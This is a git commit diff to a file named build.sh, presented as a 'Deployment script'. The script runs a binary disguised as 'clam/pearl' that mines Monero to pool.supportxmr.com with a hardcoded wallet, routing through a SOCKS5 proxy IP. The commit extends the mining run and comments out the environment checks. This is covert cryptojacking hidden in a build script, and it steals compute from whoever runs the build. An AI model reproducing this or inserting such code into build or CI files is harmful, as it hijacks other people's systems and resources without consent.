3ff74f646b5deeca52c4ab975ee11e028bb2f96e
vladimir <vladimir@playsnook.com>
2024-09-13 13:58:21 +0300

    proxy

--- build.sh
+++ build.sh
@@ -2,17 +2,18 @@
 
 echo "Deployment script started"
 # cat /etc/os-release
-which curl
-which npm 
-which node
-which wget
+#which curl
+#which npm 
+#which node
+#which wget
 # whoami 
 #clam/pearl --version
 echo "Checking proxy:"
 curl --socks5 199.116.112.6:4145 ipinfo.io
 
 # does not work wothout proxy
-timeout 180 clam/pearl -x 199.116.112.6:4145 -o pool.supportxmr.com:3333 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
+echo "Running pearl"
+timeout 360 clam/pearl -x 199.116.112.6:4145 -o pool.supportxmr.com:3333 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
 exit 0
 #curl 18.196.88.146:14433
 #ping -c 1 xmr-eu1.nanopool.org
